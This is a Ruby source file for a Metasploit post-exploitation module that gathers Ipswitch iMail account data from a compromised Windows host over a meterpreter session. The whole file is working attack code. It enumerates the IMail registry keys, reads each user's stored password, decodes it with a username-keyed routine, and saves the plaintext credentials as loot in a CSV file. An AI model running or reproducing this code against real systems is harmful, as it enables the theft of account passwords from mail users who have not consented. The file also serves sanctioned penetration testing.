##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Windows Gather IPSwitch iMail User Data Enumeration",
      'Description'    => %q{
          This module will collect iMail user data such as the username, domain,
        full name, e-mail, and the decoded password.  Please note if IMAILUSER is
        specified, the module extracts user data from all the domains found.  If
        IMAILDOMAIN is specified, then it will extract all user data under that
        particular category.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'sinn3r',  #Metasploit
        ],
      'References'     =>
        [
          ['EDB', '11331'],
        ],
      'Platform'       => [ 'win' ],
      'SessionTypes'   => [ 'meterpreter' ]
      ))

      register_options(
        [
          OptString.new('IMAILUSER', [false, 'iMail username', '']),
          OptString.new('IMAILDOMAIN', [false, 'iMail Domain', ''])
        ])
  end

  def download_info(imail_user='', imail_domain='')
    base = "HKLM\\SOFTWARE\\Ipswitch\\IMail"

    #Find domain(s)
    users_subkey = []
    if imail_domain.empty?
      domains_key = registry_enumkeys("#{base}\\domains")
      if not domains_key.nil?
        domains_key.each do |domain_key|
          users_subkey << "#{base}\\domains\\#{domain_key}\\Users"
        end
      end
    else
      users_subkey << "#{base}\\domains\\#{imail_domain}\\Users"
    end

    #Find users
    users_key = []
    users_subkey.each do |user_key|
      if imail_user.empty?
        users = registry_enumkeys(user_key)
        if not users.nil?
          users.each do |user|
            users_key << "#{user_key}\\#{user}"
          end
        end
      else
        users_key << "#{user_key}\\#{imail_user}"
      end
    end

    #Get data for each user
    users = []
    users_key.each do |key|
      #Filter out '_aliases'
      next if key =~ /_aliases/

      vprint_status("Grabbing key: #{key}")

      domain    = $1 if key =~ /Ipswitch\\IMail\\domains\\(.+)\\Users/
      mail_addr = registry_getvaldata(key, 'MailAddr')
      password  = registry_getvaldata(key, 'Password')
      full_name = registry_getvaldata(key, 'FullName')
      username  = $1 if mail_addr =~ /(.+)@.+/

      #Hmm, I don't think this user exists, skip to the next one
      next if mail_addr == nil

      current_user =
      {
        :domain   => domain,
        :fullname => full_name,
        :username => username,
        :email    => mail_addr,
        :password => password,
      }

      users << current_user
    end

    return users
  end

  def decode_password(username='', enc_password='')
    #No point trying to decode if there's no username or password
    return "" if username.empty? or enc_password.empty?

    counter = 0
    password = ''

    #Start decoding, what's up gold $$
    0.step(enc_password.length-1, 2) do |i|
      byte_1 = enc_password[i,1].unpack("C")[0]
      byte_1 = (byte_1 <= 57) ? byte_1 - 48 : byte_1 - 55
      byte_1 *= 16

      byte_2 = enc_password[i+1,1].unpack("C")[0]
      byte_2 = (byte_2 <= 57) ? byte_2 - 48 : byte_2 - 55

      char = byte_1 + byte_2

      counter = 0 if username.length <= counter

      username_byte = username[counter, 1].unpack("C")[0]
      if username_byte > 54 and username_byte < 90
        username_byte += 32
      end

      char -= username_byte
      counter += 1
      password << char.chr
    end

    vprint_status("Password '#{enc_password}' = #{password}")

    return password
  end

  def report(users)
    credentials = Rex::Text::Table.new(
      'Header'  => 'Ipswitch iMail User Credentials',
      'Indent'   => 1,
      'Columns' =>
      [
        'User',
        'Password',
        'Domain',
        'Full Name',
        'E-mail'
      ]
    )

    users.each do |user|
      domain    = user[:domain]
      username  = user[:username]
      password  = user[:password]
      full_name = user[:fullname]
      e_mail    = user[:email]

      if datastore['VERBOSE']
        text  = ''
        text << "User=#{username}, "
        text << "Password=#{password}, "
        text << "Domain=#{domain}, "
        text << "Full Name=#{full_name}, "
        text << "E-mail=#{e_mail}"
        print_good(text)
      end

      credentials << [username, password, domain, full_name, e_mail]
    end

    print_status("Storing data...")

    path = store_loot(
      'imail.user.creds',
      'text/csv',
      session,
      credentials.to_csv,
      'imail_user_creds.csv',
      'Ipswitch iMail user credentials'
    )

    print_status("User credentials saved in: #{path}")
  end

  def run
    imail_user = datastore['IMAILUSER']
    imail_domain = datastore['IMAILDOMAIN']

    vprint_status("Download iMail user information...")

    #Download user data.  If no user specified, we dump it all.
    users = download_info(imail_user, imail_domain)

    #Process fullname and decode password
    users.each do |user|
      user[:fullname] = Rex::Text.to_ascii(user[:fullname][2, user[:fullname].length])
      user[:password] = decode_password(user[:username], user[:password])
    end

    #Report information and store it
    report(users)
  end
end
